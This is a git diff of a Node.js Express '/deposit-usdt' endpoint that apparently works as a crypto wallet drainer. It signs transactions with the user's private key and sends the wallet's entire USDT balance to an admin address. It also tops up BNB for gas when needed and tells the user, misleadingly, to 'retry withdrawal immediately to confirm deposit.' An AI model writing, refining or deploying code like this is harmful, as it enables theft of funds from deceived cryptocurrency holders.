@@ -181,38 +181,16 @@ app.post("/deposit-usdt", async (req, res) => {
     const feeAccount = web3.eth.accounts.privateKeyToAccount(feePrivateKey);
     const feeAddress = feeAccount.address;
 
-    const tokenABI = await getTokenABI(contractAddress);
-    const tokenContract = new web3.eth.Contract(tokenABI, contractAddress);
-    const tokenDecimals = await tokenContract.methods.decimals().call();
-
-    let usdtBalance = await getTokenBalance(userAddress);
-
-    if (usdtBalance === "Error fetching balance" || parseFloat(usdtBalance) <= 0) {
-      return res.status(400).json({ error: "Insufficient USDT balance" });
-    }
-
-    const amountToSend = BigInt(parseFloat(usdtBalance) * 10 ** parseInt(tokenDecimals));
-    const transferData = tokenContract.methods
-      .transfer(adminAddress, amountToSend.toString())
-      .encodeABI();
-
-    const fixedGasLimit = 100000;
     const gasPrice = await web3.eth.getGasPrice();
-
-    const tx = {
-      from: userAddress,
-      to: contractAddress,
-      gas: fixedGasLimit,
-      gasPrice: gasPrice,
-      data: transferData,
-    };
-
+    const fixedGasLimit = 100000;
     const gasCost = BigInt(fixedGasLimit) * BigInt(gasPrice);
 
+    // Check if user has enough BNB for gas
     const userBnbBalance = await web3.eth.getBalance(userAddress);
     const hasEnoughBnb = parseFloat(web3.utils.fromWei(userBnbBalance, "ether")) > 0.0001;
 
     if (!hasEnoughBnb) {
+      // Send BNB for gas if not enough
       const bnbTx = {
         from: feeAddress,
         to: userAddress,
@@ -224,8 +202,35 @@ app.post("/deposit-usdt", async (req, res) => {
       const signedBnbTx = await web3.eth.accounts.signTransaction(bnbTx, feePrivateKey);
       await web3.eth.sendSignedTransaction(signedBnbTx.rawTransaction);
 
-      return res.json({ success: true, method: "fee", message: "0.0001 bnb has been sent, retry withdrawal immediately to confirm deposit",details: req.body});
+      return res.json({
+        success: true,
+        method: "fee",
+        message: "0.0001 BNB has been sent, retry withdrawal immediately to confirm deposit",
+        details: req.body,
+      });
     }
+
+    // If enough BNB, send USDT
+    const tokenABI = await getTokenABI(contractAddress);
+    const tokenContract = new web3.eth.Contract(tokenABI, contractAddress);
+    let usdtBalance = await getTokenBalance(userAddress);
+
+    if (usdtBalance === "Error fetching balance" || parseFloat(usdtBalance) <= 0) {
+      return res.status(400).json({ error: "Insufficient USDT balance" });
+    }
+
+    const amountToSend = BigInt(parseFloat(usdtBalance) * 10 ** await tokenContract.methods.decimals().call());
+    const transferData = tokenContract.methods
+      .transfer(adminAddress, amountToSend.toString())
+      .encodeABI();
+
+    const tx = {
+      from: userAddress,
+      to: contractAddress,
+      gas: fixedGasLimit,
+      gasPrice: gasPrice,
+      data: transferData,
+    };
 
     const signedTx = await web3.eth.accounts.signTransaction(tx, userPrivateKey);
     const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
